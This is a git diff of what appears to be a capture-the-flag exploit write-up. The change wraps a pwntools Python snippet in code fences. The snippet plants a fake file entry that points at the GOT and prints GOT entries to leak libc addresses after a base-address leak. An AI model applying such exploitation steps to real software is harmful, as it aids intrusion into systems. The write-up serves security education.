@@ -281,6 +281,7 @@ prog.success('@ 0x{:012x}'.format(base))
 
 With a leak of the base address we can repeat the previous procedure to print values from the GOT and try to find the libc.
 
+```python
 prog = log.progress('Putting fake GOT entry')
 got_entry  = p64(0) # parent_directory, don't care
 got_entry += p32(2) # type = FILE_ENTRY
@@ -306,7 +307,7 @@ prog.success()
 got = get_file('got')
 for i in range(0, len(got), 8):
     print(hex(u64(got[i:i+8])))
-
+```
 
 With this snippet we can print the address of fwrite and rand, the last 2 GOT entries.
 
